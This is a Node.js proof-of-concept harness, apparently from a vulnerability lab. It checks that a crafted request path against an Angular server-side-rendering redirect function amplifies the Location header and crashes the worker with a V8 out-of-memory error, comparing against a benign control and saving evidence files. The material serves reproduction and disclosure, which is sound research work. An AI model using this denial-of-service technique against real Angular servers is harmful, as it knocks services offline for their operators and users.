import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { mkdirSync, writeFileSync } from 'node:fs';
import http from 'node:http';
import net from 'node:net';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { payload } from './payload.mjs';

const root = dirname(dirname(fileURLToPath(import.meta.url)));
const heapMiB = Number(process.argv[2] ?? 256);
const targetBytes = Number(process.argv[3] ?? 16000);
assert([256, 512].includes(heapMiB), 'heap must be 256 or 512 MiB');
assert(targetBytes >= 1000 && targetBytes <= 16000, 'request target must be 1000..16000 bytes');
const defaultConcurrency = targetBytes < 10000
  ? (heapMiB === 256 ? 32 : 96)
  : (heapMiB === 256 ? 10 : 20);
const concurrency = Number(process.argv[4] ?? defaultConcurrency);
assert(concurrency >= 1 && concurrency <= 128, 'concurrency must be 1..128');
const label = process.argv[5] ?? '';
assert(/^[a-z0-9-]*$/.test(label), 'invalid evidence label');
const server = join(root, 'dist', 'angular-router-redirectfunction-ssr-oom-lab', 'server', 'server.mjs');

const candidate = payload(targetBytes, false);
const control = payload(targetBytes, true);
assert.equal(Buffer.byteLength(candidate.path), Buffer.byteLength(control.path));

async function freePort() {
  const server = net.createServer();
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const port = server.address().port;
  await new Promise((resolve) => server.close(resolve));
  return port;
}

function request(port, path) {
  return new Promise((resolve) => {
    const start = performance.now();
    const req = http.request({
      hostname: '127.0.0.1', port, path, agent: false,
      maxHeaderSize: 64 * 1024 * 1024,
    }, (res) => {
      let body = '';
      res.on('data', (chunk) => {
        if (path === '/stats' && body.length < 4096) body += chunk;
      });
      res.on('end', () => resolve({
        status: res.statusCode,
        ms: Math.round(performance.now() - start),
        locationBytes: Buffer.byteLength(res.headers.location ?? ''),
        ...(path === '/stats' ? { stats: JSON.parse(body) } : {}),
      }));
    });
    req.setTimeout(60000, () => req.destroy(new Error('timeout')));
    req.on('error', (error) => resolve({
      error: error.code ?? error.message,
      ms: Math.round(performance.now() - start),
    }));
    req.end();
  });
}

async function run(controlMode, count) {
  const port = await freePort();
  const child = spawn(process.execPath, [
    `--max-old-space-size=${heapMiB}`, server,
  ], {
    cwd: root,
    env: { ...process.env, PORT: String(port), HOST: '127.0.0.1', NODE_ENV: 'production' },
    stdio: ['ignore', 'pipe', 'pipe'],
    windowsHide: true,
  });
  let stderr = '';
  let exit = null;
  child.stderr.on('data', (data) => { stderr = (stderr + data).slice(-5000); });
  child.on('exit', (code, signal) => { exit = { code, signal }; });
  try {
    const deadline = performance.now() + 10000;
    let ready = false;
    while (performance.now() < deadline && !exit) {
      if ((await request(port, '/health')).status === 200) { ready = true; break; }
      await new Promise((resolve) => setTimeout(resolve, 100));
    }
    assert(ready, 'SSR worker did not start: ' + stderr);
    const path = controlMode ? control.path : candidate.path;
    const jobs = Array.from({ length: count }, () => request(port, path));
    const health = new Promise((resolve) => setTimeout(resolve, 25))
      .then(() => request(port, '/health'));
    const responses = await Promise.all(jobs);
    const probe = await health;
    const stats = await request(port, '/stats');
    if (stats.status !== 200 && !exit) {
      await Promise.race([
        new Promise((resolve) => child.once('exit', resolve)),
        new Promise((resolve) => setTimeout(resolve, 1000)),
      ]);
    }
    return {
      control: controlMode, concurrency: count,
      requestBytes: Buffer.byteLength(path), markers: candidate.markers,
      responses, health: probe,
      stats: stats.stats ?? null,
      exit, v8Oom: /Reached heap limit|JavaScript heap out of memory/.test(stderr),
      stderrTail: stderr.slice(-1600),
    };
  } finally {
    if (!exit) child.kill();
  }
}

const benign = await run(true, concurrency);
const single = await run(false, 1);
const attack = await run(false, concurrency);
const success = (record) => record.responses.filter((r) => r.status === 302).length;
const result = {
  platform: process.platform,
  node: process.version,
  angular: '22.2.2',
  heapMiB, targetBytes, concurrency,
  benign, single, attack,
};
mkdirSync(join(root, 'evidence'), { recursive: true });
const file = join(root, 'evidence', `direct-${heapMiB}-${targetBytes}${label ? '-' + label : ''}.json`);
writeFileSync(file, JSON.stringify(result, null, 2) + '\n');
assert.equal(success(benign), concurrency, 'equal-size control failed: ' + file);
assert.equal(benign.stats?.redirectCalls, concurrency, 'control redirected more than once/request');
assert.equal(success(single), 1, 'single candidate did not redirect');
assert.equal(single.stats?.redirectCalls, 1, 'candidate redirected more than once/request');
assert(single.responses[0].locationBytes > single.requestBytes * 100, 'no amplification');
assert(attack.v8Oom, 'expected V8 OOM did not occur');
assert.equal(attack.stats, null, 'worker survived candidate');
console.log(`PASS ${heapMiB} MiB: ${single.requestBytes} B request -> ${single.responses[0].locationBytes} B Location; ${concurrency} concurrent -> V8 OOM; control ${success(benign)}/${concurrency} HTTP 302`);
console.log(file);
